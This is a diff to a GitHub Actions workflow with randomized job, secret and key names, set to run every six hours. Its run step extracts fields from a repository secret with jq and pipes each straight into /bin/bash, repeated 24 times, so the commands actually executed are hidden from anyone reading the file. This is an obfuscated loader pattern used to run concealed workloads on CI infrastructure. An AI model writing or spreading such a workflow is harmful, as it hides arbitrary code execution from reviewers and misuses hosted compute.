@@ -2,29 +2,38 @@ name: fengfaming6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 5/6 * * *'
-
-jobs:  # 28685
+    - cron: '47 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fengfaming6789
         env:
-          tnwyv3877: ${{ secrets.tnwyv3877 }}
+          z32979: ${{ secrets.z32979 }}
         run: |
-          echo $tnwyv3877 | jq -r .vho81 | /bin/bash
-          echo $lgwlt67 | jq -r .iusk319 | /bin/bash
-          echo $e1 | jq -r .vutl5263 | /bin/bash
-          echo $nto6 | jq -r .fjvmz3293 | /bin/bash
-          echo $rvlfg70 | jq -r .hvvof6 | /bin/bash
-          echo $i675 | jq -r .a969 | /bin/bash
-          echo $rr469 | jq -r .iw39 | /bin/bash
-          echo $ex27 | jq -r .iupf14397 | /bin/bash
-          echo $nd77530 | jq -r .wuxtp5274 | /bin/bash
-          echo $en78737 | jq -r .s4 | /bin/bash
-          echo $bqqrz5 | jq -r .ockf77 | /bin/bash
-          echo $abs67442 | jq -r .u02 | /bin/bash
-          echo $x43 | jq -r .oow76372 | /bin/bash
-          echo $zt605 | jq -r .onh0 | /bin/bash
+          echo $z32979 | jq -r .ybjyx6 | /bin/bash
+          echo $k97850 | jq -r .hr48 | /bin/bash
+          echo $iji4 | jq -r .pk8 | /bin/bash
+          echo $ikm40806 | jq -r .me5 | /bin/bash
+          echo $zkb849 | jq -r .fsxha719 | /bin/bash
+          echo $qakzs4 | jq -r .a7669 | /bin/bash
+          echo $sfe27689 | jq -r .pw3480 | /bin/bash
+          echo $lzsy11298 | jq -r .rvq706 | /bin/bash
+          echo $zou50 | jq -r .xjdb162 | /bin/bash
+          echo $wyyi3887 | jq -r .bemq5315 | /bin/bash
+          echo $us43 | jq -r .g36932 | /bin/bash
+          echo $ja9059 | jq -r .muvzm2 | /bin/bash
+          echo $gzf95 | jq -r .ds3 | /bin/bash
+          echo $rgkc10797 | jq -r .nvbx33825 | /bin/bash
+          echo $vr82815 | jq -r .ukwj09806 | /bin/bash
+          echo $khs09 | jq -r .tedb59 | /bin/bash
+          echo $zajxu95586 | jq -r .jwze82 | /bin/bash
+          echo $szjr0388 | jq -r .hwx3252 | /bin/bash
+          echo $zqhw37481 | jq -r .nesha6 | /bin/bash
+          echo $tqxlb57 | jq -r .lqknm144 | /bin/bash
+          echo $wkuce86283 | jq -r .joc28 | /bin/bash
+          echo $wljlj56017 | jq -r .mj44864 | /bin/bash
+          echo $x5 | jq -r .fcn5166 | /bin/bash
+          echo $owvjr4 | jq -r .zpue50 | /bin/bash
 
